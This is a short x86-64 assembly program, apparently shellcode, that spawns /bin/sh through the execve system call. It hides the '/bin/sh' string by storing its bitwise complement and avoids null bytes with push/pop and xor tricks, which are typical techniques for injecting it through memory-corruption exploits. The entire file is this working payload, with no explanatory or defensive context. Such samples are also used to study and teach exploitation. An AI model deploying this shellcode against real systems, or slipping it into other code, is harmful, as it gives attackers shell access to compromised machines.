;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

[BITS 64]

%define SYS_EXEC	59

[SECTION .TEXT]
	global _start

_start:
	mov rax, 0xff978cd091969dd0
	not rax							; "/bin/sh"
	push rax
	push rsp
	pop rdi							; rdi -> "/bin/sh\0"

	xor rdx, rdx					; rdx = 0

	push rdx
	pop rsi							; rsi = 0

	push byte SYS_EXEC
	pop rax							; rax = SYS_EXEC

	syscall

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;